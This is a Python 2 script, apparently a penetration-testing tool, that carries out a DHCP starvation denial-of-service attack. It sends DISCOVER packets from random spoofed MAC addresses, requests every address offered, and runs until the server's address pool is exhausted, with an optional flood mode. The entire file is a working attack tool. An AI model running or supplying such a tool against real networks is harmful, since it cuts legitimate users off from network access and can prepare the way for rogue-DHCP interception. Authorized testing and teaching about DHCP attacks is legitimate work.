#!/usr/bin/python

import argparse, sys, os, thread


class DHCPDos:
    __broadcast_mac = "ff:ff:ff:ff:ff:ff"
    __broadcast_ip = "255.255.255.255"
    __no_ip = "0.0.0.0"
    __filter = "udp and (port 67 or port 68)"
    

    def __init__(self, iface, flood):
        if os.getuid() == 0:
            self.__iface = iface
            self.__flood = flood
            self.__iface_addr = get_if_hwaddr(iface)
            self.__dict = {}
            self.__dos = False
        else:
            print "Must be superuser to do this."
            sys.exit(-1)

    def run(self):
        if not self.__flood:
            thread.start_new_thread(self.__sniff_pkt, ())
        self.__send_pkt()

    def __build_pkt(self, mac_addr, xid, server_id=None, req_addr=None):
        dhcp_pkt = Ether(src=self.__iface_addr, dst=self.__broadcast_mac) / \
                   IP(src=self.__no_ip, dst=self.__broadcast_ip) / \
                   UDP(sport=68, dport=67) / \
                   BOOTP(chaddr=mac_addr, xid=xid, flags=0x8000)
        if (server_id and req_addr) is not None:
            dhcp_pkt /= DHCP(
                options=[("message-type", "request"), ("server_id", server_id), ("requested_addr", req_addr), "end"])
        else:
            dhcp_pkt /= DHCP(options=[("message-type", "discover"), "end"])
        return dhcp_pkt

    def __send_pkt(self):
        while self.__dos is False:
            mac_addr = RandMAC()._fix()
            mac_addr = mac_addr[0] + "E" + mac_addr[2:]
            xid = RandInt()._fix()
            self.__dict[xid] = True
            sendp(self.__build_pkt(mac2str(mac_addr), xid), iface=self.__iface, verbose=False)
            if not self.__flood:
                time.sleep(1)


    def __sniff_pkt(self):
        self.__start = time.time()
        sniff(filter=self.__filter, stop_filter=self.__detect_dhcp, store=0, iface=self.__iface)
        print "DHCP exhausted!"

    def __detect_dhcp(self, pkt):
        if DHCP in pkt:
            if pkt[DHCP].options[0][1] == 2 and self.__dict.has_key(pkt[BOOTP].xid):
                print "Received DHCP offer from " + pkt[IP].src + " with address: " + pkt[BOOTP].yiaddr
                sendp(self.__build_pkt(pkt[BOOTP].chaddr, pkt[BOOTP].xid, pkt[IP].src, pkt[BOOTP].yiaddr),
                      iface=self.__iface, verbose=False)
                print "\t DHCP request sent"
                self.__start = time.time()
            elif pkt[DHCP].options[0][1] == 5 and self.__dict.has_key(pkt[BOOTP].xid):
                lease_time = [lease for lease in pkt[DHCP].options if lease[0] == "lease_time"]
                print "DHCP ack for " + pkt[BOOTP].yiaddr + " with lease time of: " + str(lease_time[0][1]) + " s"
                del self.__dict[pkt[BOOTP].xid]
                self.__start = time.time()
        if (time.time() - self.__start) > 5:
            self.__dos = True
            return True


parser = argparse.ArgumentParser(description="dhcp_dos")
parser.add_argument("-i", "--interface", action="store", help="Name of the interface", required=True)
parser.add_argument("-f", "--flood", action="store_true", default=False, required=False)
parser = parser.parse_args()
try:
    DHCPDos(parser.interface, parser.flood).run()
except KeyboardInterrupt:
    print "Execution stopped by the user"
